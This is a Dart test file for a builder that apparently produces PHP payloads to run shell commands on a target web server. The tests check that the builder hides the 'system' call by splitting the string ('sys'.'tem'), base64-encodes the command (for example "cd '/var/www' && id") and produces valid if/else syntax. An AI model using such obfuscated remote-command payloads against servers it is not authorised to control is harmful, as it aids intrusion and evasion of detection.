import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:matrix/connectors/php_command_payload.dart';

void main() {
  group('buildPhpCommandPayload', () {
    test('initializes the system fallback before the if/else branch', () {
      final code = buildPhpCommandPayload('id');

      final assignment = code.indexOf(r"$y='sys'.'tem';");
      final condition = code.indexOf(r'if(function_exists($s)');
      final elseBranch = code.indexOf(r'else{@$y');

      expect(assignment, greaterThanOrEqualTo(0));
      expect(
        condition,
        greaterThan(assignment),
        reason: r'把 $y 赋值放在 if 之后、else 之前会让 PHP 报 unexpected else',
      );
      expect(elseBranch, greaterThan(condition));
    });

    test('base64-encodes the command for target-side decoding', () {
      const command = "cd '/var/www' && id";
      final code = buildPhpCommandPayload(command);

      final match = RegExp(r"\$f\('([^']*)'\)").firstMatch(code);
      expect(match, isNotNull);
      expect(utf8.decode(base64Decode(match!.group(1)!)), command);
    });

    test('does not put a statement between the if block and else', () {
      final code = buildPhpCommandPayload('id');

      expect(code, isNot(contains(r";}$y='sys'.'tem';else")));
      expect(code, contains('}else{'));
    });
  });
}
